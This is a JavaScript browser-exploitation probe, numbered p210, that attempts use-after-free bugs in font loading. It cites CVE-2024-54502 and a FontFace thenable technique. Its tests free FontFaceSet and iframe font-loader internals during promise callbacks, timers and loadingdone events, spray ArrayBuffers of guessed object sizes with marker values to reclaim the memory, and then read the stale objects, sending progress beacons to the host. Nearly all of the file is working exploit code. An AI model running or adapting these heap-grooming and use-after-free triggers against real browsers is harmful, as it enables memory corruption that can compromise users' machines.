// p210 — FontFace UAF with REAL fonts + correct ntfargo thenable technique
//
// p204 got NetworkError because base64 font data was invalid.
// This uses real .ttf files served from the host.
//
// Test A: Verify fonts actually load (gate for all other tests)
// Test B: ntfargo CSSFontFace thenable trick (FontFace.prototype.then)
// Test C: CVE-2024-54502 fontLoadingTimerFired iframe document destruction
// Test D: Clear during loadingdone event + spray
// Test E: Rapid add/load/clear with GC pressure
// Test F: Cross-document font adoption + iframe destruction
//
// Beacon prefix: V210-

(function() {
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V210-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  B('BOOT');

  var tests = [];
  var currentTest = 0;
  var fontsWork = false;

  // ── TEST A: Verify font loading works ──
  tests.push({name: 'A-VERIFY', run: function(done) {
    var face = new FontFace('VerifyFont', 'url(f0.ttf)');
    document.fonts.add(face);
    face.load().then(function(f) {
      B('A-STATUS-' + f.status);
      fontsWork = (f.status === 'loaded');
      B('A-WORKS-' + fontsWork);
      document.fonts.delete(face);
      done();
    }).catch(function(e) {
      B('A-FAIL-' + e.name + '-' + e.message.substring(0,50));
      done();
    });
  }});

  // ── TEST B: ntfargo CSSFontFace thenable trick ──
  // Key: patch FontFace.prototype.then so FontFace objects become thenables.
  // When document.fonts.load() resolves, Promise machinery calls .then()
  // on each FontFace in the result array. Inside that callback, we clear
  // the FontFaceSet → CSSFontFace internals get freed while FontFaceSet
  // still holds raw pointers.
  tests.push({name: 'B-THENABLE', run: function(done) {
    if (!fontsWork) { B('B-SKIP-FONTS-BROKEN'); done(); return; }

    var faces = [];
    var faceRefs = [];
    for (var i = 0; i < 20; i++) {
      var f = new FontFace('Thenable' + i, 'url(f' + (i % 9) + '.ttf?b=' + i + '_' + Math.random() + ')');
      document.fonts.add(f);
      faces.push(f);
      faceRefs.push(f);
    }
    B('B-ADDED-' + faces.length);

    var thenCalls = 0;
    var origThen = FontFace.prototype.then;

    // Patch FontFace.prototype.then — makes every FontFace a thenable
    FontFace.prototype.then = function(resolve, reject) {
      thenCalls++;
      if (thenCalls === 1) {
        B('B-THEN-HIT-1');

        // Free all CSSFontFace objects by clearing the set
        document.fonts.clear();
        B('B-CLEARED');

        // Null out our references so GC can collect FontFace objects
        // (which releases CSSFontFace refs)
        for (var k = 1; k < faceRefs.length; k++) {
          faceRefs[k] = null;
        }
        faces.length = 0;

        // GC pressure to free CSSFontFace objects
        var garbage = [];
        for (var g = 0; g < 50000; g++) {
          garbage.push(new ArrayBuffer(32));
        }
        garbage = null;
        B('B-GC-DONE');

        // Spray ArrayBuffer at sizeof(CSSFontFace) to reclaim
        // Try multiple size classes: 64, 96, 128, 192, 256
        var spray = [];
        var sizes = [64, 96, 128, 192, 256];
        for (var s = 0; s < sizes.length; s++) {
          for (var j = 0; j < 2000; j++) {
            var ab = new ArrayBuffer(sizes[s]);
            var view = new DataView(ab);
            // Fill with marker pattern
            view.setUint32(0, 0x41424344, true);
            if (sizes[s] >= 8) view.setUint32(4, 0x45464748, true);
            if (sizes[s] >= 16) view.setUint32(8, 0xDEADBEEF, true);
            if (sizes[s] >= 24) view.setUint32(12, 0xCAFEBABE, true);
            spray.push(ab);
          }
        }
        B('B-SPRAYED-' + spray.length);
      }
      if (thenCalls <= 3) B('B-THEN-' + thenCalls);

      // Resolve with self — continues promise chain
      resolve(this);
    };

    // Trigger: document.fonts.load resolves → Promise.all calls .then() on FontFaces
    document.fonts.load('16px Thenable0').then(function(loadedFaces) {
      B('B-LOAD-RESOLVED-' + (loadedFaces ? loadedFaces.length : 'null'));

      // Try to read CSSFontFace-backed properties on the freed faces
      for (var i = 0; i < faceRefs.length; i++) {
        if (!faceRefs[i]) continue;
        try {
          var fs = faceRefs[i].featureSettings;
          B('B-FEAT-' + i + '-' + (fs === 'normal' ? 'N' : fs));
        } catch (e) {
          B('B-FEAT-ERR-' + i + '-' + e.name);
        }
        try {
          var disp = faceRefs[i].display;
          B('B-DISP-' + i + '-' + disp);
        } catch (e) {
          B('B-DISP-ERR-' + i + '-' + e.name);
        }
        try {
          var urange = faceRefs[i].unicodeRange;
          B('B-URANGE-' + i + '-' + (urange ? urange.substring(0,20) : 'null'));
        } catch (e) {
          B('B-URANGE-ERR-' + i + '-' + e.name);
        }
        break; // Only check first surviving ref
      }

      B('B-THEN-TOTAL-' + thenCalls);

      // Restore prototype
      if (origThen) FontFace.prototype.then = origThen;
      else delete FontFace.prototype.then;

      done();
    }).catch(function(e) {
      B('B-CATCH-' + e.name);
      if (origThen) FontFace.prototype.then = origThen;
      else delete FontFace.prototype.then;
      done();
    });

    setTimeout(function() {
      if (origThen) FontFace.prototype.then = origThen;
      else delete FontFace.prototype.then;
      done();
    }, 8000);
  }});

  // ── TEST C: CVE-2024-54502 fontLoadingTimerFired ──
  // DocumentFontLoader has a timer. Start font loading in iframe,
  // destroy iframe while timer is pending → timer fires on freed DocumentFontLoader.
  tests.push({name: 'C-TIMER', run: function(done) {
    if (!fontsWork) { B('C-SKIP'); done(); return; }

    var destroyed = 0;
    for (var round = 0; round < 20; round++) {
      var iframe = document.createElement('iframe');
      iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-999px;';
      document.body.appendChild(iframe);

      try {
        var iDoc = iframe.contentDocument;
        if (!iDoc) { B('C-NO-IDOC-' + round); continue; }

        // Add fonts to iframe's document.fonts
        for (var i = 0; i < 5; i++) {
          var f = new FontFace('IfrTimer' + round + '_' + i,
            'url(f' + (i % 9) + '.ttf?c=' + round + '_' + i + ')');
          iDoc.fonts.add(f);
          f.load(); // starts loading → sets up fontLoadingTimer
        }

        // Also trigger font loading via CSS
        var style = iDoc.createElement('style');
        style.textContent = '@font-face { font-family: "CSSTimer' + round + '"; src: url(f' + (round % 9) + '.ttf?css=' + round + '); } .test { font-family: "CSSTimer' + round + '"; }';
        iDoc.head.appendChild(style);
        var div = iDoc.createElement('div');
        div.className = 'test';
        div.textContent = 'Loading font...';
        iDoc.body.appendChild(div);

        // Force layout in iframe to trigger CSS font load
        var _ = div.offsetHeight;
      } catch (e) {
        B('C-SETUP-ERR-' + round + '-' + e.name);
      }

      // IMMEDIATELY destroy iframe while fonts are loading
      // fontLoadingTimer should be pending
      iframe.remove();
      destroyed++;
    }
    B('C-DESTROYED-' + destroyed);

    // Heavy GC pressure to free the iframe documents
    var garbage = [];
    for (var gc = 0; gc < 50000; gc++) {
      garbage.push(new ArrayBuffer(128));
    }
    garbage = null;
    B('C-GC');

    // More GC
    for (var gc2 = 0; gc2 < 50000; gc2++) {
      new ArrayBuffer(256);
    }
    B('C-GC2');

    // Wait for any pending timers to fire on freed memory
    setTimeout(function() {
      B('C-WAIT1');
      setTimeout(function() {
        B('C-SURVIVED');
        done();
      }, 2000);
    }, 2000);
  }});

  // ── TEST D: Delete during loadingdone + spray ──
  tests.push({name: 'D-LOADINGDONE', run: function(done) {
    if (!fontsWork) { B('D-SKIP'); done(); return; }

    var faces = [];
    for (var i = 0; i < 30; i++) {
      var f = new FontFace('LoadDone' + i, 'url(f' + (i % 9) + '.ttf?d=' + i + ')');
      document.fonts.add(f);
      faces.push(f);
    }
    B('D-ADDED-30');

    document.fonts.onloadingdone = function(ev) {
      B('D-EVENT-' + ev.fontfaces.length);

      // Delete all faces during the event callback
      document.fonts.clear();
      B('D-CLEARED');

      // Spray
      var spray = [];
      for (var s = 0; s < 5000; s++) {
        spray.push(new ArrayBuffer(128));
        var v = new DataView(spray[spray.length-1]);
        v.setUint32(0, 0xDEADDEAD, true);
      }
      B('D-SPRAYED');

      // Access the event's fontfaces — these may reference freed CSSFontFace
      for (var j = 0; j < ev.fontfaces.length && j < 5; j++) {
        try {
          var st = ev.fontfaces[j].status;
          var fs = ev.fontfaces[j].featureSettings;
          B('D-EV-' + j + '-' + st + '-' + (fs === 'normal' ? 'N' : fs));
        } catch (e) {
          B('D-EV-ERR-' + j + '-' + e.name);
        }
      }

      // Also try our original references
      for (var k = 0; k < faces.length && k < 3; k++) {
        try {
          var st2 = faces[k].status;
          B('D-REF-' + k + '-' + st2);
        } catch (e) {
          B('D-REF-ERR-' + k + '-' + e.name);
        }
      }
    };

    // Load all
    for (var j = 0; j < faces.length; j++) {
      faces[j].load();
    }

    setTimeout(function() {
      document.fonts.onloadingdone = null;
      done();
    }, 5000);
  }});

  // ── TEST E: Rapid font lifecycle with GC ──
  tests.push({name: 'E-RAPID', run: function(done) {
    if (!fontsWork) { B('E-SKIP'); done(); return; }

    for (var round = 0; round < 200; round++) {
      var f = new FontFace('Rapid' + round,
        'url(f' + (round % 9) + '.ttf?e=' + round + ')');
      document.fonts.add(f);
      f.load();
      document.fonts.delete(f);

      if (round % 20 === 0) {
        // GC pressure every 20 rounds
        for (var g = 0; g < 1000; g++) new ArrayBuffer(64);
      }
    }
    B('E-200-CYCLES');

    setTimeout(function() {
      B('E-SURVIVED');
      done();
    }, 2000);
  }});

  // ── TEST F: Cross-doc adoption then iframe destroy ──
  tests.push({name: 'F-CROSSDOC', run: function(done) {
    if (!fontsWork) { B('F-SKIP'); done(); return; }

    var iframe = document.createElement('iframe');
    iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-999px;';
    document.body.appendChild(iframe);

    var iDoc = iframe.contentDocument;
    if (!iDoc) { B('F-NO-IDOC'); done(); return; }

    var iframeFaces = [];
    for (var i = 0; i < 10; i++) {
      var f = new FontFace('Cross' + i, 'url(f' + (i % 9) + '.ttf?f=' + i + ')');
      iDoc.fonts.add(f);
      iframeFaces.push(f);
    }
    B('F-ADDED-' + iframeFaces.length);

    // Start loading fonts in iframe
    var loadPromises = iframeFaces.map(function(f) {
      return f.load().catch(function() { return null; });
    });

    Promise.all(loadPromises).then(function(results) {
      var loaded = results.filter(function(r) { return r && r.status === 'loaded'; }).length;
      B('F-LOADED-' + loaded);

      // Destroy iframe
      iframe.remove();
      B('F-IFRAME-REMOVED');

      // GC pressure
      for (var g = 0; g < 20000; g++) new ArrayBuffer(128);
      B('F-GC');

      // Access orphaned fonts
      for (var j = 0; j < iframeFaces.length && j < 3; j++) {
        try {
          var st = iframeFaces[j].status;
          var fam = iframeFaces[j].family;
          B('F-ORPHAN-' + j + '-' + st);
        } catch (e) {
          B('F-ORPHAN-ERR-' + j + '-' + e.name);
        }
      }

      // Try adding orphaned fonts to main document
      for (var k = 0; k < iframeFaces.length; k++) {
        try {
          document.fonts.add(iframeFaces[k]);
        } catch (e) {
          if (k === 0) B('F-READD-ERR-' + e.name);
        }
      }
      B('F-READDED');

      // Access via main document
      try {
        var fs = iframeFaces[0].featureSettings;
        B('F-FEAT-' + (fs === 'normal' ? 'N' : fs));
      } catch (e) {
        B('F-FEAT-ERR-' + e.name);
      }

      document.fonts.clear();
      done();
    }).catch(function(e) {
      B('F-CATCH-' + e.name);
      iframe.remove();
      done();
    });

    setTimeout(function() { done(); }, 8000);
  }});

  // ── Run all tests ──
  function runNext() {
    if (currentTest >= tests.length) {
      B('ALL-DONE');
      return;
    }
    var t = tests[currentTest++];
    B(t.name + '-START');
    var completed = false;
    var timeout = setTimeout(function() {
      if (!completed) { completed = true; B(t.name + '-TIMEOUT'); runNext(); }
    }, 15000);
    t.run(function() {
      if (!completed) {
        completed = true;
        clearTimeout(timeout);
        B(t.name + '-END');
        setTimeout(runNext, 500);
      }
    });
  }

  runNext();
})();
